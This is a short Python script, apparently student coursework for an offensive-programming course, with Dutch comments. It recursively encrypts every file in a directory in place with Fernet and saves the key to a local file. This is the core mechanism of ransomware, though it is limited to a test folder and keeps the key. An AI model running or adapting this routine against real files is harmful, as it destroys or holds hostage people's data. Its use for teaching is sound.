#! "C:\Users\polde\OneDrive - HvA\Cyber_Security_AD_1_2024\blok3\programming\new\env\Scripts\python"
# Encryptor - Offensive Programming - Blok3

from cryptography.fernet import Fernet  #Crypto-Fernet import module
import os

# Geneer sleutel (Fernet Basis)
key = Fernet.generate_key()
cipher_suite = Fernet(key)

def encrypt_file(file_path):
    """Encrypt a file using Fernet symmetric encryption."""
    with open(file_path, 'rb') as file:
        # Lees data file
        file_data = file.read()
        # Encrypt data file
        encrypted_data = cipher_suite.encrypt(file_data)
        # Schrijf terug
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def encrypt_directory(directory_path):
    """Recursively encrypt each file in directory and subdirectories."""
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path)
            print(f"Encrypted {file_path}")

# Directory Om te Ecrypten ---  PAS OP !!!!
directory_to_encrypt = "encrypt-this"
encrypt_directory(directory_to_encrypt)

# Bewaar de sleutel naar file 
with open("encryption_key.key", 'wb') as keyfile:
    keyfile.write(key)
print("DutchJinn.com - Encryption complete. Don't lose the key!")